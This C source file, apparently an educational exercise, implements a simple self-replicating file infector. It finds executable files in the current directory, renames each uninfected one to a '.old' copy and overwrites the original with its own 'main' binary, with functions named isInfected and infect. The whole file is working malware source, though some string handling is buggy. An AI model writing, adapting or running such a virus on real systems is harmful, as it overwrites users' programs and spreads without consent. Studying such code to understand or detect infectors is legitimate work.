#include <dirent.h>
#include <libgen.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

typedef struct {
  char new[1000];
  char old[1000];
} pg;

char *isInfected(pg *files) {
  static char file[500];
  char *strToken = strtok(files->new, "/");
  while (strToken != NULL) {
    if (strstr(files->old, strToken) == NULL) {
      snprintf(file, sizeof(file), "%s/%s", file, strToken);
    }
    strToken = strtok(NULL, "/");
  }
  return file;
}

/**
 * @brief
 * @params
 * @return
 */
void infect(char *fileUninfected) {
  DIR *dir;
  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }
  char *strToken = strtok(fileUninfected, "/");
  while (strToken != NULL) {
    char tempName[50];
    FILE *fp1, *fp2;
    char ch;

    strcpy(tempName, strToken);
    strcat(tempName, ".old");
    rename(strToken, tempName);

    fp1 = fopen("main", "r");
    fp2 = fopen(strToken, "w");

    while ((ch = getc(fp1)) != EOF)
      putc(ch, fp2);

    fclose(fp1);
    fclose(fp2);
    strToken = strtok(NULL, "/");
  }
}

pg *fileFinder() {
  DIR *dir;
  struct dirent *dp;
  static pg file;

  if ((dir = opendir(".")) == NULL) {
    perror("Cannot open .");
    exit(EXIT_FAILURE);
  }

  while ((dp = readdir(dir)) != NULL) {
    struct stat st;
    if (stat(dp->d_name, &st) == 0 && S_ISREG(st.st_mode) &&
        (st.st_mode & S_IXUSR) && strcmp(dp->d_name, "main")) {
      printf("Nom : %s, Mode: %o\n", dp->d_name, st.st_mode);
      if (strstr(dp->d_name, "old") != NULL) {
        snprintf(file.old, sizeof(file.old), "%s/%s", file.old, dp->d_name);
      } else {
        snprintf(file.new, sizeof(file.new), "%s/%s", file.new, dp->d_name);
      }
    }
  }

  closedir(dir);
  return &file;
}

int main(void) {
  pg *files = fileFinder();
  char *fileUninfected = isInfected(files);
  infect(fileUninfected);
  char *strToken = strtok(fileUninfected, "/");
  while (strToken != NULL) {
    printf("%s\n", strToken);
    strToken = strtok(NULL, "/");
  }
}
